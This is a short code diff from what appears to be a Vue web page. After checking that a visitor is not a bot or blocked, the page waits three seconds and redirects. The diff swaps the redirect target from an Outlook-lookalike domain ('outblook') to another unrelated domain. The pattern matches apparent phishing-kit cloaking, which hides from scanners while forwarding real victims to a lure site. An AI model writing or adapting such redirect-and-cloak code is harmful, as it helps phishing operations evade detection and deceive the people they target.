@@ -48,7 +48,7 @@ const app = createApp({
       // If not blocked or bot, proceed to the main page
       if (!isBot.value && !isBlocked.value) {
         setTimeout(() => {
-          window.location.href = 'https://outblook.mohearn.co.uk/';
+          window.location.href = 'https://mkt.asirargentina.com.ar/';
         }, 3000);
       }
 
